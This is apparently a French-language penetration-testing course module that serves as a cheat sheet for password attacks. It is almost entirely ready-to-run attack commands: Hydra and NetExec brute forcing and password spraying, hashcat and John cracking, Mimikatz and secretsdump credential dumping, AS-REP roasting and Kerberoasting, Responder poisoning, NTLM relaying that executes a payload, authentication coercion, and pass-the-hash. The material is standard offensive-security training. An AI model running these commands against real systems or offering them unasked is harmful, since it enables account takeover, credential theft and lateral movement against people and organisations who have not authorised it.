# 10 — Password Attacks

## Objectifs
Cracker, pulvériser et réutiliser des credentials : brute force en ligne, cracking hors ligne (hashcat/john), Kerberoasting/AS-REP, relais NTLM, pass-the-hash.

---

## 1. Wordlists & règles

```bash
ls /usr/share/wordlists/
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Générer des variantes (mots de passe d'entreprise)
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
john --wordlist=base.txt --rules --stdout > mutated.txt

# Cewl : mots du site
cewl http://<TARGET> -d 3 -m 6 -w cewl.txt
```

### Username generation
```bash
# prénom.nom, pnom, prenom
username_generator.py firstnames.txt lastnames.txt
# À partir d'une liste d'employés (LinkedIn / OSINT)
```

---

## 2. Brute force en ligne

### Hydra
```bash
# SSH
hydra -L users.txt -P <WORDLIST> ssh://<TARGET>
hydra -l <USER> -P <WORDLIST> ssh://<TARGET> -t 4 -f

# FTP
hydra -L users.txt -P <WORDLIST> ftp://<TARGET>

# RDP (attention verrouillage)
hydra -L users.txt -P <WORDLIST> rdp://<TARGET> -t 1 -W 3

# HTTP Basic
hydra -L users.txt -P <WORDLIST> http-get://<TARGET>/admin

# HTTP POST form
hydra -L users.txt -P <WORDLIST> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -t 10

# MySQL / MSSQL
hydra -L users.txt -P <WORDLIST> mysql://<TARGET>
hydra -L users.txt -P <WORDLIST> mssql://<TARGET>

# SMTP / IMAP / POP3
hydra -L users.txt -P <WORDLIST> smtp://<TARGET>
hydra -L users.txt -P <WORDLIST> imap://<TARGET>
```

### Medusa
```bash
medusa -h <TARGET> -U users.txt -P <WORDLIST> -M ssh -t 4
medusa -h <TARGET> -U users.txt -P <WORDLIST> -M smbnt
```

### NetExec (ex-CrackMapExec)
```bash
# SMB spray
netexec smb <TARGET> -u users.txt -p 'Password123' --continue-on-success
netexec smb <TARGET> -u users.txt -p passwords.txt --no-bruteforce

# WinRM / LDAP / RDP / SSH / MSSQL
netexec winrm <TARGET> -u users.txt -p <PASS>
netexec ldap <DC_IP> -u users.txt -p <PASS>
netexec rdp <TARGET> -u users.txt -p <PASS>
netexec ssh <TARGET> -u users.txt -p <PASS>
netexec mssql <TARGET> -u users.txt -p <PASS>
```

### Password spraying (1 mot de passe, N users)
```bash
netexec smb <DC_IP> -u users.txt -p 'Winter2026!' --continue-on-success
# Attention : verrouillage de compte (lockout threshold)
```

---

## 3. Cracking hors ligne

### Identifier les hashs
```bash
hashid '<HASH>'
hash-identifier
```

### Hashcat — modes courants
| Mode | Type |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1000 | NTLM |
| 1800 | sha512crypt (`$6$`) |
| 500 | md5crypt (`$1$`) |
| 3200 | bcrypt (`$2*$`) |
| 13100 | Kerberoast (`$krb5tgs$23$`) |
| 18200 | AS-REP (`$krb5asrep$23$`) |
| 22000 | WPA-PBKDF2 |
| 7300 | IPMI RAKP |

```bash
hashcat -m 1000 ntlm.txt <WORDLIST> -O -w 4
hashcat -m 18200 asrep.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerberoast.txt <WORDLIST> --force

# Masque (brute force ciblé)
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d?d
hashcat -m 1000 hash.txt -a 3 -1 ?l?d '?1?1?1?1?1?1?1?1'

# Combinator
hashcat -m 0 hash.txt -a 1 words1.txt words2.txt
```

### John
```bash
john --wordlist=<WORDLIST> hashes.txt
john --format=NT hashes.txt --wordlist=<WORDLIST>
john --rules --wordlist=<WORDLIST> hashes.txt
john --show hashes.txt

# Extraire un hash depuis un fichier
zip2john file.zip > zip.hash
rar2john file.rar > rar.hash
ssh2john id_rsa > ssh.hash
7z2john file.7z > 7z.hash
pdf2john file.pdf > pdf.hash
```

---

## 4. Windows — récupération de hashs

```cmd
:: Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```

```bash
# Impacket secretsdump (à distance)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-secretsdump -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>
```

```cmd
:: Registre (si admin)
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SECURITY security.hiv
```

---

## 5. Kerberos attacks (aperçu — détail module 13)

```bash
# AS-REP Roasting (comptes sans pré-auth)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
netexec ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt

# Kerberoasting (SPN)
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerb.txt
netexec ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting kerb.txt

# Crack
hashcat -m 18200 asrep.txt <WORDLIST>
hashcat -m 13100 kerb.txt <WORDLIST>
```

---

## 6. NTLM relay & Responder

```bash
# Responder (empoisonnement LLMNR/NBT-NS/mDNS)
sudo responder -I tun0 -wv

# Capture NetNTLMv2 → crack
hashcat -m 5600 capture.txt <WORDLIST>
john --format=netntlmv2 capture.txt

# ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
impacket-ntlmrelayx -t smb://<TARGET> -smb2support -e shell.exe

# Désactiver SMB/HTTP dans Responder.conf pour relayer
```

### Forcer l'authentification
```bash
# PetitPotam / PrinterBug (lab)
python3 PetitPotam.py <LHOST> <TARGET>
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET> <LHOST>
```

---

## 7. Pass-the-Hash / Pass-the-Ticket

```bash
# PtH SMB
netexec smb <TARGET> -u <USER> -H <NTHASH>
impacket-psexec -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>
impacket-wmiexec -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>

# PtT (ticket .kirbi / ccache)
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

---

## 8. Bonus : cracking de fichiers

```bash
# ZIP / RAR / 7z / PDF / SSH
fcrackzip -u -D -p <WORDLIST> file.zip
rar2john file.rar > h && john h --wordlist=<WORDLIST>
ssh2john id_rsa > h && john h --wordlist=<WORDLIST>

# Keepass
keepass2john db.kdbx > h && john h --wordlist=<WORDLIST>
```

---

## Checklist
- [ ] Liste d'utilisateurs valide (énumération)
- [ ] Politique de verrouillage connue (`--pass-pol`)
- [ ] Wordlist adaptée au contexte (cewl, règles)
- [ ] Attaque en ligne limitée en threads
- [ ] Hashs identifiés puis crackés hors ligne
- [ ] Credentials valides testés sur tous les services
- [ ] Réutilisation / PtH / Kerberos explorés

## Aide-mémoire
| Besoin | Commande |
|---|---|
| Spray SMB | `netexec smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| Crack NTLM | `hashcat -m 1000 h.txt rockyou.txt` |
| AS-REP | `impacket-GetNPUsers ... -format hashcat` |
| Kerberoast | `impacket-GetUserSPNs ... -request` |
| Relay | `impacket-ntlmrelayx -tf targets.txt -smb2support` |
| PtH | `netexec smb <IP> -u u -H <hash>` |
